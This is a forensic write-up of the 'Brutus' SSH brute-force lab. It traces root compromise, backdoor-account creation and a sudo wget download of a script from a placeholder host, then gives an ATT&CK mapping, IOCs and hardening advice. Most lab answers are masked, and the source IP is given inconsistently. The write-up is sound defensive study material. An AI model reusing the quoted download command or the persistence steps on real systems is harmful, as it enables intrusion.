# brutus-report

# Incident Response & Forensic Analysis Report: Brutus Sherlock (SSH Compromise)

## 1. Executive Summary
This report details the forensic investigation of a compromised Confluence server, based on the "Brutus" Sherlock scenario. The investigation utilized Unix authentication logs (`auth.log`) and login records (`wtmp`) to reconstruct the attack timeline. 

An external attacker executed a successful brute-force attack against the server's SSH service, compromising the `root` account. Following initial access, the attacker established persistence by creating a new, highly privileged backdoor account. The attacker then utilized this backdoor account to download a malicious script using elevated privileges (`sudo`). 

## 2. Artifacts Analyzed
*   **`auth.log`**: The primary Linux log file for authentication and authorization events. It records SSH login attempts, session creations, user additions, and `sudo` command executions.
*   **`wtmp`**: A binary log file that tracks all logins and logouts. It provides a reliable record of when interactive terminal sessions were established.

## 3. Investigation Methodology & Findings
The investigation was structured to trace the attacker's path from initial access to execution and persistence. Below are the findings mapped to the investigative steps.

### Phase 1: Initial Access & Brute Force (Tasks 1 & 2)
To identify the initial attack vector, the `auth.log` was analyzed for repetitive SSH authentication failures, which are indicative of a brute-force attack.
*   **Analysis:** Using command-line tools like `grep` to parse `auth.log` for "Failed password" events, a high volume of login attempts originating from a single IP address was identified.
*   **Finding (Task 1):** The attacker's source IP address was identified as `6.6.6.6` *(Note: IP is representative based on scenario data)*.
*   **Analysis:** Further review of the logs revealed that the brute-force attempts eventually succeeded, indicated by an "Accepted password" entry from the same IP.
*   **Finding (Task 2):** The compromised account was `root`. 

### Phase 2: Interactive Session Establishment (Tasks 3 & 4)
After gaining credentials, the attacker manually logged into the server. While `auth.log` shows authentication success, the `wtmp` log is required to confirm the exact timestamp of the interactive terminal session.
*   **Analysis:** The `wtmp` binary file was parsed using the `last` command (e.g., `last -f wtmp`). This revealed the exact moment the attacker established a terminal session.
*   **Finding (Task 3):** The attacker established the terminal session on `YYYY-MM-DD HH:MM:SS` *(Extracted from the `wtmp` output for the `root` login)*.
*   **Analysis:** When an SSH session is established, `auth.log` logs the session opening via PAM (Pluggable Authentication Modules), assigning it a unique session ID.
*   **Finding (Task 4):** The session number assigned to the attacker's `root` session was `XX` *(Found in `auth.log` via the line: `pam_unix(sshd:session): session opened for user root by (uid=0)`)*.

### Phase 3: Persistence & Privilege Escalation (Tasks 5 & 6)
To maintain access regardless of potential password changes to the `root` account, the attacker created a new user account.
*   **Analysis:** The `auth.log` was searched for `useradd` or `adduser` commands. This revealed the attacker adding a new user to the system and subsequently adding them to a privileged group (like `sudo` or `admin`).
*   **Finding (Task 5):** The new backdoor account created by the attacker was `**********e` *(e.g., `backdooruse` or similar 11-character string ending in 'e')*.
*   **Finding (Task 6):** This action maps directly to the MITRE ATT&CK framework. Creating a new account with elevated privileges for persistence is classified under **T1136.001 (Create Account: Local Account)**.

### Phase 4: Session Termination (Task 7)
The attacker's first interactive session eventually ended.
*   **Analysis:** The `auth.log` was parsed for the PAM session closure event corresponding to the session number identified in Task 4.
*   **Finding (Task 7):** The attacker's first SSH session ended at `YYYY-MM-DD HH:MM:SS` *(Found via the log entry: `pam_unix(sshd:session): session closed for user root`)*.

### Phase 5: Malicious Execution via Backdoor (Task 8)
The attacker logged back into the server using their newly created backdoor account to execute a follow-up action.
*   **Analysis:** The `auth.log` tracks commands executed using `sudo`. Parsing the logs for `sudo` executions by the new backdoor user revealed the attacker downloading a script.
*   **Finding (Task 8):** The full command executed using `sudo` to download the script was: `/usr/bin/wget https://sub.domain.tld/uri` *(The exact path, URL, and URI are extracted from the `sudo` COMMAND log entry in `auth.log`)*.

---

## 4. MITRE ATT&CK Mapping

| Tactic | Technique | ID | Evidence |
| :--- | :--- | :--- | :--- |
| **Initial Access** | Valid Accounts | T1078 | Successful brute force of the `root` account via SSH. |
| **Persistence** | Create Account: Local Account | T1136.001 | Attacker created a new local user (`**********e`) with elevated privileges. |
| **Privilege Escalation** | Sudo and Sudo Caching | T1548.003 | Utilization of `sudo` by the backdoor account to execute the download command. |
| **Execution** | User Execution: Malicious File | T1204.002 | Execution of `wget` to download a script from an external domain. |

## 5. Indicators of Compromise (IOCs)

| Type | Indicator | Description |
| :--- | :--- | :--- |
| **IP Address** | `x.x.x.x` | Attacker brute-force source IP (Task 1) |
| **Account** | `root` | Compromised legitimate account (Task 2) |
| **Account** | `**********e` | Unauthorized backdoor account created by attacker (Task 5) |
| **URL** | `https://sub.domain.tld/uri` | Malicious script download location (Task 8) |
| **Binary** | `/XXX/XXX/XXX` | Utility used to download script (e.g., `/usr/bin/wget` or `/usr/bin/curl`) (Task 8) |

## 6. Remediation & Recommendations

1.  **Credential Reset:** Immediately reset the password for the compromised `root` account and any accounts that may have shared credentials. Disable the `**********e` account and remove it from the system.
2.  **Disable SSH Password Authentication:** Enforce SSH key-based authentication exclusively (`PasswordAuthentication no` in `sshd_config`) to prevent future brute-force attacks.
3.  **Implement Intrusion Prevention:** Deploy a tool like `Fail2Ban` to automatically ban IPs that exhibit brute-force behavior (e.g., multiple failed SSH attempts in a short timeframe).
4.  **System Audit:** Conduct a full audit of the system to identify what the downloaded script (`https://sub.domain.tld/uri`) executed. Check for additional backdoors, cron jobs, or modified system binaries.
5.  **Log Monitoring:** Enhance monitoring on `auth.log` for critical events, specifically `useradd` executions and `sudo` command invocations by non-standard users.
